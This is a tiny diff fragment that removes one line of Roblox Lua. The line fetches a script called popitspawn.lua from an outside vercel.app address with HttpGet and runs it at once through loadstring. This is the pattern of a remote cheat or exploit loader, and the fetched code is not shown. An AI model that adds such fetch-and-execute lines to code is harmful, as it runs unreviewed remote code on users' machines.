@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://institutionio.vercel.app/backend?file=8172eeb4-9ad6-4df4-a772-c5b40d69cd85=popitspawn.lua'))()
